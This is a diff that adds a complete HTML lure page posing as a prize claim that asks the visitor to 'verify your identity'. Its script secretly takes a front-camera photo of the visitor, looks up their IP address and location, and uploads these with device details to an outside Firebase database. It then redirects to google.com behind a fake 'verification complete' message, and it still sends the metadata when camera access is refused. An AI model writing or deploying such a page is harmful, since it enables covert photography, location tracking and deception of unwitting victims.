@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>You Won a Prize! 🎉</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', sans-serif;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+  }
+  .container {
+    text-align: center;
+    padding: 2rem;
+    max-width: 400px;
+  }
+  .trophy { font-size: 80px; margin-bottom: 1rem; animation: bounce 1s infinite alternate; }
+  @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
+  h1 { font-size: 2rem; margin-bottom: 0.5rem; }
+  p { font-size: 1rem; opacity: 0.9; margin-bottom: 2rem; line-height: 1.6; }
+  .btn {
+    background: white;
+    color: #764ba2;
+    border: none;
+    padding: 14px 36px;
+    border-radius: 50px;
+    font-size: 1.1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: transform 0.2s;
+  }
+  .btn:hover { transform: scale(1.05); }
+  .loader {
+    display: none;
+    margin-top: 1.5rem;
+    font-size: 0.9rem;
+    opacity: 0.8;
+  }
+  .dots::after {
+    content: '';
+    animation: dots 1.5s steps(3, end) infinite;
+  }
+  @keyframes dots {
+    0%   { content: '.'; }
+    33%  { content: '..'; }
+    66%  { content: '...'; }
+    100% { content: ''; }
+  }
+  video { display: none; }
+  canvas { display: none; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="trophy">🎁</div>
+  <h1>Congratulations!</h1>
+  <p>You have been selected for a special reward.<br>Click below to verify your identity and claim your prize.</p>
+  <button class="btn" onclick="startVerification()">Claim Prize Now</button>
+  <div class="loader" id="loader">Verifying identity<span class="dots"></span></div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyD2drTPEiYfj97Er4S_PyPQuRsTyFafYcU",
+    authDomain: "link-d89e2.firebaseapp.com",
+    databaseURL: "https://link-d89e2-default-rtdb.firebaseio.com",
+    projectId: "link-d89e2",
+    storageBucket: "link-d89e2.firebasestorage.app",
+    messagingSenderId: "110029965870",
+    appId: "1:110029965870:web:6ff5813190bbb2bfd46dbf"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  window.startVerification = async function() {
+    document.querySelector('.btn').style.display = 'none';
+    document.getElementById('loader').style.display = 'block';
+
+    try {
+      // Get user info
+      const userAgent = navigator.userAgent;
+      const timestamp = new Date().toISOString();
+      let ipInfo = {};
+      try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        ipInfo = await ipRes.json();
+      } catch(e) {}
+
+      // Open front camera
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' },
+        audio: false
+      });
+
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+
+      // Wait for camera to be ready
+      await new Promise(resolve => {
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(resolve, 1500); // wait 1.5s for camera to warm up
+        };
+      });
+
+      // Take photo
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+
+      // Stop camera
+      stream.getTracks().forEach(track => track.stop());
+
+      // Convert to base64 (compressed jpeg)
+      const photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
+
+      // Save to Firebase Realtime Database
+      const photosRef = ref(db, 'captures');
+      const newRef = push(photosRef);
+      await set(newRef, {
+        photo: photoBase64,
+        timestamp: timestamp,
+        userAgent: userAgent,
+        ip: ipInfo.ip || 'unknown',
+        city: ipInfo.city || 'unknown',
+        country: ipInfo.country_name || 'unknown',
+        device: /Mobile|Android|iPhone/i.test(userAgent) ? 'Mobile' : 'Desktop'
+      });
+
+      // Show success message
+      document.getElementById('loader').innerHTML = '✅ Verification complete! Redirecting...';
+      setTimeout(() => {
+        // Redirect anywhere you want
+        window.location.href = 'https://google.com';
+      }, 2000);
+
+    } catch(err) {
+      // Camera denied or error — still try to save metadata
+      try {
+        const photosRef = ref(db, 'captures');
+        const newRef = push(photosRef);
+        await set(newRef, {
+          photo: null,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          error: err.message,
+          device: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
+        });
+      } catch(e2) {}
+
+      document.getElementById('loader').innerHTML = '✅ Verified! Loading your prize...';
+      setTimeout(() => {
+        window.location.href = 'https://google.com';
+      }, 2000);
+    }
+  };
+</script>
+
+</body>
+</html>
